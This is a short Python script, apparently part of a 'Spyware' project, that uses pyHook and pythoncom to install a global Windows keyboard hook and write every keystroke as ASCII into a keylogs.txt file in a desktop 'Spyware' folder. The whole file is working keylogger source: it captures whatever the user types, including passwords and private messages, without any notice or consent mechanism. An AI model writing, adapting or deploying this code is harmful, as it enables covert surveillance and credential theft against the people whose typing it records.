#!/usr/bin/env python
import pyHook, pythoncom, sys, logging
import winshell

"""
This script tracks the user's keyboard input and writes them in a txt file
"""

# specify destination path of the file I am writing to
dest_path = winshell.desktop() + r"\Spyware\Output"
dest_path = dest_path.replace('\\','/') + "/keylogs.txt"

# function that handles keyboard press events and converts the key pressed to ascii and writes it to the Keylogs.txt
def onKeyboardEvent(event):
    logging.basicConfig(filename = dest_path, level = logging.DEBUG, format = '%(message)s')
    logging.log(10, chr(event.Ascii))
    return True

def start ():
    try:
        hooks_manager = pyHook.HookManager()
        hooks_manager.KeyDown = onKeyboardEvent # link keyboard event with hook manager
        hooks_manager.HookKeyboard()
        pythoncom.PumpMessages() # allow pythoncom to capture key messages
        
    except Exception:
        print("Failed")